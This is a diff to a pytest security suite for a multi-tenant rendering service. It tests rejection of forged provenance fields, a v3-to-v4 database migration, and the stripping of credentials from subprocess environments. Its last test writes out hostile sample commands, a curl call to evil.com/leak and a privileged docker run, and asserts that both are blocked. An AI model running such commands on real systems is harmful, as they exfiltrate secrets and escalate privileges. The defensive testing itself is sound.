@@ -24,7 +24,7 @@ from pathlib import Path
 
 import pytest
 
-from api.core.errors import IdempotencyConflictError
+from api.core.errors import IdempotencyConflictError, ProvenanceConflictError
 from api.services.run_service import RunService
 from scripts.core.database import DatabaseEngine, TenantRepository, set_database_engine
 from scripts.core.run_model import RunRecord, RunStatus
@@ -363,20 +363,31 @@ def test_cross_tenant_storage_key_rejected(test_env):
 
     foreign_key = f"workspaces/ws_attacker_999/projects/{proj_id}/blueprints/bad.json"
 
+    # 1. API level: Server rejects client-supplied foreign immutable_storage_key
+    with pytest.raises(ProvenanceConflictError):
+        RunService.create_run(
+            project_id=proj_id,
+            workspace_id=ws_id,
+            payload={
+                "task": "render",
+                "immutable_storage_key": foreign_key,
+            },
+        )
+
+    # 2. Defense-in-depth: If forged row exists in DB, worker fails closed with CROSS_TENANT_STORAGE_VIOLATION
     run, _ = RunService.create_run(
         project_id=proj_id,
         workspace_id=ws_id,
-        payload={
-            "task": "render",
-            "immutable_storage_key": foreign_key,
-        },
+        payload={"task": "render"},
     )
+    repo = RunRepository()
+    with repo._get_connection() as conn:
+        conn.execute("UPDATE runs SET immutable_storage_key = ? WHERE run_id = ?", (foreign_key, run.run_id))
 
     worker = PipelineWorker(worker_id="worker_test_6")
     processed = worker.process_one()
     assert processed is True
 
-    repo = RunRepository()
     final_run = repo.get_run(run.run_id)
     assert final_run.status == RunStatus.FAILED
     assert final_run.failure_code == "CROSS_TENANT_STORAGE_VIOLATION"
@@ -483,3 +494,315 @@ def test_worker_restart_preserves_pinned_provenance(test_env):
     assert recovered_run.immutable_storage_key == meta["storage_key"]
     assert recovered_run.approved_review_bundle_id == meta["bundle_id"]
     assert recovered_run.lifecycle_state_revision == 1
+
+
+def test_client_forged_provenance_fields_rejected_by_server(test_env):
+    """
+    PR-005 Security Boundary 2:
+    Client-provided forged or conflicting provenance fields in RunCreateRequest
+    must be strictly rejected, and server authority must govern execution provenance.
+    """
+    from api.core.errors import ProvenanceConflictError
+    from scripts.core.database import TenantSecurityError
+
+    ws_id = test_env["ws_id"]
+    proj_id = test_env["proj_id"]
+    bp_dict = _create_sample_blueprint("Security Test Video")
+    meta = _setup_approved_blueprint_state(test_env, bp_dict, revision=1)
+
+    # 1. Forged canonical_blueprint_sha256 -> Rejected
+    with pytest.raises(ProvenanceConflictError) as exc_info:
+        RunService.create_run(
+            project_id=proj_id,
+            workspace_id=ws_id,
+            payload={"canonical_blueprint_sha256": "fake_malicious_blueprint_hash_000000000000"},
+        )
+    assert "canonical_blueprint_sha256" in str(exc_info.value)
+
+    # 2. Forged approved_review_bundle_id -> Rejected
+    with pytest.raises(ProvenanceConflictError) as exc_info:
+        RunService.create_run(
+            project_id=proj_id,
+            workspace_id=ws_id,
+            payload={"approved_review_bundle_id": "bundle_fake_unauthorized_999"},
+        )
+    assert "approved_review_bundle_id" in str(exc_info.value)
+
+    # 3. Forged canonical_document_revision -> Rejected
+    with pytest.raises(ProvenanceConflictError) as exc_info:
+        RunService.create_run(
+            project_id=proj_id,
+            workspace_id=ws_id,
+            payload={"canonical_document_revision": 9999},
+        )
+    assert "canonical_document_revision" in str(exc_info.value)
+
+    # 4. Forged lifecycle_state_revision -> Rejected
+    with pytest.raises(ProvenanceConflictError) as exc_info:
+        RunService.create_run(
+            project_id=proj_id,
+            workspace_id=ws_id,
+            payload={"lifecycle_state_revision": 8888},
+        )
+    assert "lifecycle_state_revision" in str(exc_info.value)
+
+    # 5. Forged immutable_storage_key -> Rejected
+    with pytest.raises(ProvenanceConflictError) as exc_info:
+        RunService.create_run(
+            project_id=proj_id,
+            workspace_id=ws_id,
+            payload={"immutable_storage_key": "workspaces/evil_ws/blueprints/evil.json"},
+        )
+    assert "immutable_storage_key" in str(exc_info.value)
+
+    # 6. Forged cross-tenant workspace_id in payload -> Rejected
+    with pytest.raises(TenantSecurityError) as exc_info:
+        RunService.create_run(
+            project_id=proj_id,
+            workspace_id=ws_id,
+            payload={"workspace_id": "ws_other_victim_tenant"},
+        )
+    assert "conflicts with verified tenant workspace" in str(exc_info.value)
+
+    # 7. Legitimate request with no forged values -> Derives strictly from authoritative repositories
+    legit_run, created = RunService.create_run(
+        project_id=proj_id,
+        workspace_id=ws_id,
+        payload={},
+    )
+    assert created is True
+    assert legit_run.canonical_document_revision == 1
+    assert legit_run.canonical_blueprint_sha256 == meta["blueprint_sha256"]
+    assert legit_run.immutable_storage_key == meta["storage_key"]
+    assert legit_run.approved_review_bundle_id == meta["bundle_id"]
+    assert legit_run.lifecycle_state_revision == 1
+    assert legit_run.workspace_id == ws_id
+
+
+def test_schema_v3_to_v4_migration_and_data_preservation(tmp_path: Path):
+    """
+    PR-005 Database Schema Compatibility 4:
+    Existing Schema-v3 database upgrades cleanly to Schema-v4 without data loss,
+    preserving all existing run records and exposing new provenance columns.
+    """
+    import sqlite3
+    db_file = tmp_path / "legacy_v3.db"
+
+    # 1. Build a pure Schema-v3 database
+    conn = sqlite3.connect(str(db_file))
+    conn.execute("""
+        CREATE TABLE _schema_migrations (
+            version INTEGER PRIMARY KEY,
+            applied_at TEXT NOT NULL
+        )
+    """)
+    conn.execute("INSERT INTO _schema_migrations VALUES (1, '2026-01-01T00:00:00Z')")
+    conn.execute("INSERT INTO _schema_migrations VALUES (2, '2026-01-02T00:00:00Z')")
+    conn.execute("INSERT INTO _schema_migrations VALUES (3, '2026-01-03T00:00:00Z')")
+
+    conn.execute("""
+        CREATE TABLE runs (
+            run_id TEXT PRIMARY KEY,
+            project_id TEXT NOT NULL,
+            workspace_id TEXT NOT NULL DEFAULT 'ws_default',
+            status TEXT NOT NULL,
+            created_at TEXT NOT NULL,
+            updated_at TEXT NOT NULL,
+            started_at TEXT,
+            finished_at TEXT,
+            attempt INTEGER NOT NULL DEFAULT 1,
+            worker_id TEXT,
+            lease_expires_at TEXT,
+            input_revision INTEGER,
+            idempotency_key TEXT,
+            request_payload_hash TEXT,
+            failure_code TEXT,
+            failure_detail TEXT,
+            result_reference TEXT
+        )
+    """)
+    conn.execute("""
+        CREATE TABLE project_execution_leases (
+            project_id TEXT PRIMARY KEY,
+            workspace_id TEXT NOT NULL DEFAULT 'ws_default',
+            run_id TEXT NOT NULL,
+            worker_id TEXT NOT NULL,
+            acquired_at TEXT NOT NULL,
+            expires_at TEXT NOT NULL,
+            heartbeat_at TEXT NOT NULL
+        )
+    """)
+    conn.execute("""
+        CREATE TABLE run_events (
+            event_id TEXT PRIMARY KEY,
+            workspace_id TEXT NOT NULL DEFAULT 'ws_default',
+            run_id TEXT NOT NULL,
+            project_id TEXT NOT NULL,
+            sequence INTEGER NOT NULL,
+            event_type TEXT NOT NULL,
+            stage TEXT,
+            timestamp TEXT NOT NULL,
+            payload_json TEXT NOT NULL,
+            UNIQUE (run_id, sequence)
+        )
+    """)
+
+    # Seed existing Run record in Schema-v3
+    conn.execute("""
+        INSERT INTO runs (
+            run_id, project_id, workspace_id, status, created_at, updated_at, attempt, input_revision
+        ) VALUES (
+            'run_legacy_v3_01', 'prj_legacy', 'ws_acme', 'SUCCEEDED', '2026-01-04T00:00:00Z', '2026-01-04T00:01:00Z', 1, 5
+        )
+    """)
+    conn.commit()
+    conn.close()
+
+    # 2. Open with RunRepository, triggering automatic migration to CURRENT_SCHEMA_VERSION = 4
+    repo = RunRepository(db_path=db_file)
+
+    # 3. Verify migration table indicates v4
+    with repo._get_connection() as check_conn:
+        cur = check_conn.execute("SELECT MAX(version) FROM _schema_migrations")
+        assert cur.fetchone()[0] == 4
+
+        # Verify new columns exist in runs table
+        info_cur = check_conn.execute("PRAGMA table_info(runs)")
+        cols = {r[1] for r in info_cur.fetchall()}
+        for expected_col in [
+            "canonical_document_revision",
+            "canonical_blueprint_sha256",
+            "immutable_storage_key",
+            "approved_review_bundle_id",
+            "lifecycle_state_revision",
+        ]:
+            assert expected_col in cols, f"Missing migrated column: {expected_col}"
+
+    # 4. Verify pre-existing data is preserved intact (no data loss)
+    legacy_run = repo.get_run("run_legacy_v3_01")
+    assert legacy_run is not None
+    assert legacy_run.run_id == "run_legacy_v3_01"
+    assert legacy_run.project_id == "prj_legacy"
+    assert legacy_run.workspace_id == "ws_acme"
+    assert legacy_run.status == RunStatus.SUCCEEDED
+    assert legacy_run.input_revision == 5
+    assert legacy_run.canonical_document_revision is None  # Null for historical runs
+
+    # 5. Insert new v4 run with full provenance into migrated database
+    new_v4_run = RunRecord(
+        run_id="run_v4_migrated_02",
+        workspace_id="ws_acme",
+        project_id="prj_legacy",
+        status=RunStatus.QUEUED,
+        input_revision=6,
+        canonical_document_revision=3,
+        canonical_blueprint_sha256="abc123sha256hash",
+        immutable_storage_key="workspaces/ws_acme/blueprints/rev_3.json",
+        approved_review_bundle_id="bundle_v4_123",
+        lifecycle_state_revision=6,
+    )
+    repo.create_run(new_v4_run)
+
+    read_back = repo.get_run("run_v4_migrated_02")
+    assert read_back is not None
+    assert read_back.canonical_document_revision == 3
+    assert read_back.canonical_blueprint_sha256 == "abc123sha256hash"
+    assert read_back.immutable_storage_key == "workspaces/ws_acme/blueprints/rev_3.json"
+    assert read_back.approved_review_bundle_id == "bundle_v4_123"
+    assert read_back.lifecycle_state_revision == 6
+
+
+def test_nested_subprocess_credential_isolation_from_pipeline_worker():
+    """
+    PR-005 Subprocess Credential Isolation 1:
+    Even when PipelineWorker explicitly passes allow_database_env=True to scripts/pipeline.py,
+    downstream/nested subprocesses (FFmpeg, Remotion, render_project, gates, docker)
+    cannot inherit DATABASE_URL, RUNS_DB_PATH, AUTH_SECRET_KEY, or their aliases.
+    """
+    import sys
+    from scripts.core.security.command_policy import (
+        CommandPolicy,
+        DATABASE_CREDENTIAL_ENV_VARS,
+        CommandSecurityViolation,
+    )
+
+    # 1. Pipeline child environment received from worker
+    worker_child_env = {
+        "PATH": "/usr/bin",
+        "DATABASE_URL": "sqlite:///authoritative_cluster.db",
+        "RUNS_DB_PATH": "/secrets/runs.db",
+        "MOTION_RUNS_DB_PATH": "/secrets/runs.db",
+        "AUTH_SECRET_KEY": "jwt-signing-secret-do-not-leak",
+        "AGY_IS_MANAGED": "1",
+        "AGY_RUN_ID": "run_test_nested",
+    }
+
+    # 2. Pipeline executes nested render_project.py (allow_database_env=False)
+    render_val = CommandPolicy.validate_command(
+        [sys.executable, "scripts/render_project.py", "prj_nested_test"],
+        is_production=True,
+    )
+    clean_render_env = CommandPolicy.sanitize_environment(
+        worker_child_env,
+        is_production=True,
+        target_script="scripts/render_project.py",
+        allow_database_env=False,
+    )
+    for cred in DATABASE_CREDENTIAL_ENV_VARS:
+        assert cred not in clean_render_env, f"SECURITY LEAK: {cred} leaked to render_project.py!"
+        assert cred not in render_val.sanitized_env, f"SECURITY LEAK: {cred} leaked in validate_command!"
+
+    # 3. Pipeline executes nested gates/final_qc.py
+    clean_qc_env = CommandPolicy.sanitize_environment(
+        worker_child_env,
+        is_production=True,
+        target_script="scripts/gates/final_qc.py",
+        allow_database_env=False,
+    )
+    for cred in DATABASE_CREDENTIAL_ENV_VARS:
+        assert cred not in clean_qc_env, f"SECURITY LEAK: {cred} leaked to final_qc.py!"
+
+    # 4. Nested Remotion execution
+    clean_remotion_env = CommandPolicy.sanitize_environment(
+        worker_child_env,
+        is_production=True,
+        target_script="npx",
+        allow_database_env=False,
+    )
+    for cred in DATABASE_CREDENTIAL_ENV_VARS:
+        assert cred not in clean_remotion_env, f"SECURITY LEAK: {cred} leaked to Remotion!"
+
+    # 5. Nested FFmpeg execution
+    clean_ffmpeg_env = CommandPolicy.sanitize_environment(
+        worker_child_env,
+        is_production=True,
+        target_script="ffmpeg",
+        allow_database_env=False,
+    )
+    for cred in DATABASE_CREDENTIAL_ENV_VARS:
+        assert cred not in clean_ffmpeg_env, f"SECURITY LEAK: {cred} leaked to FFmpeg!"
+
+    # 6. Unauthorized commands (e.g. privileged docker, curl) must be rejected by CommandPolicy
+    val_priv = CommandPolicy.validate_command(["docker", "run", "--privileged", "ubuntu"], is_production=True)
+    assert val_priv.is_allowed is False
+    assert any("privileged" in v for v in val_priv.violations)
+
+    val_bad_exe = CommandPolicy.validate_command(["curl", "http://evil.com/leak"], is_production=True)
+    assert val_bad_exe.is_allowed is False
+
+    from scripts.security.security import safe_subprocess
+    with pytest.raises(PermissionError):
+        safe_subprocess(["docker", "run", "--privileged", "ubuntu"])
+
+    with pytest.raises(PermissionError):
+        safe_subprocess(["curl", "http://evil.com/leak"])
+
+    # 7. Even when Docker run is invoked, database credentials cannot leak into it
+    clean_docker_env = CommandPolicy.sanitize_environment(
+        worker_child_env,
+        is_production=True,
+        target_script="run",
+        allow_database_env=False,
+    )
+    for cred in DATABASE_CREDENTIAL_ENV_VARS:
+        assert cred not in clean_docker_env, f"SECURITY LEAK: {cred} leaked to Docker!"
